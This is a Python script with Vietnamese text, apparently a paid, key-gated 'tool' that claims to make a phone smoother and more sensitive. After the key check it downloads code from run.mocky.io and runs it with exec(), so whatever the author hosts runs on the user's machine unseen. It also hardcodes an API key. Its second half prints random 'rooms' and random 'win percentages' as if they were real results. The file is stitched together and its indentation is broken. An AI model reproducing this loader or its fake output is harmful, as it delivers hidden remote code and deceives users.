def some_function():
    import random  # This is indented
from atexit import register
from time import sleep
import os,json,re,sys
import threading,base64
import os,time,re,json,random
from datetime import datetime
from time import sleep,strftime
import requests
os.system("cls")
dau="\033[1;31m[\033[1;37m×.×\033[1;31m] \033[1;37m➩"
banner = f"""\033[1;32m
\033[1;37m╠═══════════════════════════════════════════════════════════════════════════════════║
\033[1;32m║➢ Tool By    :          Lê Minh Hoà                                                    ║
\033[1;36m║➢ ADMIN : LE MINH HOA ( MHOA )                                 ║  
\033[1;31m║➣ ZALO HỖ TRỢ : 0889550699                                                    ║   
\033[1;33m║➣ TÁC DỤNG : TĂNG NHẠY MÁY MƯỢT MÁY 👾                                                              ║
\033[1;37m╚═══════════════════════════════════════════════════════════════════════════════════╝
\033[1;39m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;39m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
\033[1;39m┌──────────────────────── LE MINH HOA ────────────────────────┐
\033[1;32m║   \033[1;39mPYTHON VERSION\033[1;32m 3.0                                    \033[1;32m║
\033[1;32m║   \033[1;39mTELEGRAM           :  @taolaonlymhoaz                               \033[1;32m║
\033[1;32m║   \033[1;39mTOOL WORLD         :  TOOL BY MHOA                              \033[1;32m║
\033[1'32m║   \033[1;39mBOX HỖ TRỢ ZALO              :   https://zalo.me/g/wtnmep369                              \033[1;32m║ 
\033[1;39m└────────────────────────────────────────────────────────┘
"""
for h in banner:
       sys.stdout.write(h)
       sys.stdout.flush()
       sleep(0.0003)
menu=f"""
\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = =
\033[1;37m┌─────────────────────┐
\033[1;36m║  \033[1;37m    INPUT KEY      \033[1;36m║
\033[1;37m└─────────────────────┘
\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = """
for h in menu:
   sys.stdout.write(h)
   sys.stdout.flush()
   sleep(0.0005)
ngay=int(strftime('%d'))
key1=str(ngay*1246881818+2888181472) 
key = 'MHOA'+key1
keyv1 = 'hannie1231237123'
url_8link = 'https://minhhoadeptrai.vn/='+key
apikey_8link = 'b564ff1c655514a60f5393e5c3261020b9911982084a601444903f6173f4d44e'
link1s = requests.get(f'https://partner.8link.io/api/public/gen-shorten-link?apikey={apikey_8link}&url={url_8link}').json()
if 'shortened_url' not in link1s:
    print('Error: Unable to generate shortened link.')
    quit()
else:
    link_key = link1s['shortened_url']
h=open('keyDEV.txt',mode='a+')
h=open('keyDEV.txt',mode='r')
thien=h.read()
h.close()
print()
if thien== keyv1 or thien== key:
    print(dau,'\033[1;33mXIN CHÀO \033[1;32m! CHÚC BẠN CHẠY TOOL VUI VẺ...')
    sleep(1)
    exec(requests.get('https://run.mocky.io/v3/17bf0406-139f-46a9-ad1b-2a76aefb1da1').text)
else:
     print(dau,'\033[1;32mTOOL FREE ! BẢN THỬ NHIỆM - MUA TOOL LIÊN HỆ ZALO 0889550699 - 200k/ SÀI VĨNH VIỄN !')
     print('\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = ')
print(dau,'\033[1;33mLINK LẤY API KEY LÀ:\033[1;31m '+link_key)
print('\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = ')
keynhap = input('\033[1;31m[\033[1;37m×.×\033[1;31m] \033[1;37m➩ \033[1;32mINPUT API KEY\033[1;33m ~>\033[1;36m ')
print("\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = ")
if keynhap == key or keynhap== keyv1:
    print(dau,'\033[1;32mAPI KEY ĐÚNG OPEN TOOL !')
    print("\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = ")
    sleep(2)
    h=open('keyDEV.txt',mode='w')
    h.write(keynhap)
    h.close()
    exec(requests.get('https://run.mocky.io/v3/cb48e7de-b60f-4f30-a60a-3b5f330d5dcc').text)
else:
    print(dau,'\033[1;33mAPI KEY SAI ! VUI LÒNG TẮT TOOL KHỞI ĐỘNG LẠI !')
    print("\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = ")
    sleep(1000000000)
def my_function():  # Line 84
 import random  # Line 85 is indented
import time
from datetime import datetime

try:
    from colorama import Fore, Back, Style, init
    init(autoreset=True)
except ModuleNotFoundError:
    print("Thư viện 'colorama' chưa được cài đặt. Ứng dụng sẽ chạy mà không có màu sắc.")
    Fore = Back = Style = ""

# Danh sách các phòng
rooms = [
    "DPI SENSI", "MAX NHẠY", "X2 FOR", "RAMX10", 
    "REGEDIT", "CONFIG", "AIMDATA", "BLUSV2"
]

# Yêu cầu người dùng nhập ID
user_id = input(Fore.CYAN + "🆔 VUI LÒNG NHẬP ID ACC: ")

print(Fore.GREEN + f"✅ HELLO BY MHOA {user_id}! TOOL SẮP BẮT ĐẦU.")

while True:
    # Chọn ngẫu nhiên một phòng từ danh sách
    random_room = random.choice(rooms)
    
    # Tạo phần trăm chiến thắng ngẫu nhiên
    win_percentage = random.uniform(0, 100)
    
    # Lấy thời gian hiện tại
    current_time = datetime.now().strftime("%H:%M:%S")
    
    # Hiển thị phòng ngẫu nhiên, phần trăm chiến thắng, và thời gian hiện tại
    print(Back.BLUE + Fore.WHITE + f"🕒 THỜI GIAN: {current_time}")
    print(Back.BLUE + Fore.WHITE + f"🏠 BẮT ĐẦU: {random_room} - TỈ LỆ: {win_percentage:.2f}%")
    
    # Đếm ngược 60 giây
    for remaining_time in range(60, 0, -1):
        print(Fore.YELLOW + f"⏳ Đếm ngược: {remaining_time}s", end="\r")
        time.sleep(1)
    
    print(Fore.GREEN + "\n🎉 Kết quả đã sẵn sàng!")
